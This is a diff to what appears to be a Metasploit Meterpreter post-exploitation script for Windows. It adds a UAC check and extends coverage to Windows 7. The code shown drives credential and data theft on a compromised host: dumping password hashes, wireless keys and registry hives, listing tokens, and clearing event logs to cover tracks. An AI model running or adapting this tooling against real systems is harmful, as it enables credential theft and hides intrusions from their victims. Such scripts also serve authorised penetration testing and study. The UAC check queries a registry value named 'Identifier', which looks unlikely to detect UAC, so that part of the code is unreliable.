@@ -570,7 +570,28 @@ def migrate(session)
 	#killApp(oldProc)
   	#Dangerous depending on the service exploited
 end
-
+#---------------------------------------------------------------------------------------------------------
+#Function for Checking for UAC
+def uaccheck(session)
+        uac = false
+        winversion = session.sys.config.sysinfo
+        if winversion['OS']=~ /Windows Vista/ or  winversion['OS']=~ /Windows 7/
+                if session.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
+                        begin
+                                print_status("Checking if UAC is enabled .....")
+                                key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
+                                if key.query_value('Identifier') == 1
+                                        print_status("UAC is Enabled")
+                                        uac = true
+                                end
+                                key.close
+                        rescue::Exception => e
+                                print_status("Error Checking UAC: #{e.class} #{e}")
+                        end
+                end
+        end
+        return uac
+end
 ################## MAIN ##################
 # Parsing of Options
 rd = nil
@@ -613,6 +634,7 @@ if helpopt != 1
 	filewrt(dest,header)
 	filewrt(dest,chkvm(session))
 	trgtos = info['OS']
+	uac = uaccheck(session)
 	# Run Commands according to OS some commands are not available on all versions of Windows
 	if trgtos =~ /(Windows XP)/
 		filewrt(dest,list_exec(session,commands))
@@ -634,13 +656,17 @@ if helpopt != 1
 		else
 			filewrt(dest,gethash(session))
 		end
-	elsif trgtos =~ /(Windows Vista)/
+	elsif trgtos =~ /(Windows Vista)/ or trgtos =~ /(Windows 7)/
 		filewrt(dest,list_exec(session,commands + vstwlancmd))
 		filewrt(dest,wmicexec(session,wmic))
 		filewrt(dest,findprogs(session))
-		dumpwlankeys(session,logs,filenameinfo)
+		if not uac
+			dumpwlankeys(session,logs,filenameinfo) 
+		else
+			print_status("UAC is enabled, Wireless key Registry could not be dumped under current privileges")
+		end
 		if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
-			print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows Vista if not System.")
+			print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows Vista or Windows 7 if not System.")
 		else
 			filewrt(dest,gethash(session))
 		end
@@ -652,15 +678,23 @@ if helpopt != 1
 	#filewrt(dest,gethash(session))
 	filewrt(dest,listtokens(session))
 	if (rd != nil)
-		regdump(session,logs,filenameinfo)
-		filewrt(dest,"Registry was dumped and downloaded")
+		if not uac
+			regdump(session,logs,filenameinfo) 
+			filewrt(dest,"Registry was dumped and downloaded")
+		else
+			print_status("UAC is enabled, Registry Keys could not be dumped under current privileges")
+		end
 	end
 	if (cm != nil)
 		filewrt(dest,"EventLogs where Cleared")
 		if trgtos =~ /(Windows 2000)/
 			covertracks(session,cmdstomp - nowin2kexe)
 		else
-			covertracks(session,cmdstomp)
+			if not uac
+				covertracks(session,cmdstomp)
+			else
+				print_status("UAC is enabled, Logs could not be cleared under current privileges")
+			end
 		end
 	end
 	print_status("Done!")
